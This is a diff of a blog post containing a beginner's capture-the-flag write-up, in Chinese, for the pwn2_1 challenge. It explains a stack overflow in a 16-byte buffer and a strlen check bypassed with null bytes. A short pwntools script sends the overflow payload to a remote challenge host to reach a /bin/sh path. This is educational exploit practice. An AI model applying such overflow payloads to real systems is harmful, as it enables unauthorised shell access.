@@ -12,7 +12,7 @@
 <meta property="og:image" content="https://wulala11.github.io/2022/10/31/pwn2-1/5.png">
 <meta property="og:image" content="https://wulala11.github.io/2022/10/31/pwn2-1/6.png">
 <meta property="article:published_time" content="2022-10-31T10:03:12.000Z">
-<meta property="article:modified_time" content="2022-10-31T10:04:38.922Z">
+<meta property="article:modified_time" content="2022-10-31T10:12:45.869Z">
 <meta property="article:author" content="wulala">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wulala11.github.io/2022/10/31/pwn2-1/1.png"><title>萌新解题——极客大挑战pwn2_1 | The Sun Also Rises</title><link ref="canonical" href="https://wulala11.github.io/2022/10/31/pwn2-1/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
@@ -48,8 +48,8 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></he
 <img src="/2022/10/31/pwn2-1/2.png" class="">可以看到如果跳转到b4ckd00r的话，会退出运行。因此2-1并不能像1-1一样直接跳转到b4ckd00r里。
 <p>不过在流程图和汇编部分中能发现一个path</p>
 <img src="/2022/10/31/pwn2-1/3.png" class=""><img src="/2022/10/31/pwn2-1/4.png" class="">path能进入/bin/sh中来获取shell。
-<p>所以大概得到的思路是通过栈溢出来跳转到path的地址。<br>so,去main函数中找是否溢出点</p>
-<img src="/2022/10/31/pwn2-1/5.png" class="">同pwn1-1一样定义了一个16位长度的字符数组buf，而read能读取0x1000个字符，所以可以通过栈溢出跳转到path。
+<p>所以大概得到的思路是通过栈溢出来跳转到path的地址。<br>so,去main函数中找是否有溢出点</p>
+<img src="/2022/10/31/pwn2-1/5.png" class="">main中和pwn1-1一样定义了一个16位长度的字符数组buf，而read能读取0x1000个字符，所以可以通过栈溢出跳转到path。
 <p>不过2-1有一个限制条件</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( strlen(buf) &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Bye bye~~&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></div></figure>
 <p>  所以要先绕过这个限制条件，百度了一下strlen遇到\0会停止读取，所以，只需要在写脚本时将填充buf的字符’a’换成’\0’即可绕过strlen的限制。<br>  写脚本<br>  <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#p=process(&#x27;./pwn2_1&#x27;)</span><br><span class="line">p=remote(&#x27;gxh191.top&#x27;, 25531)</span><br><span class="line">payload=b&#x27;\0&#x27;*16+p64(0)+p64(0x4011EF)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure><br>成功得到flag</p>
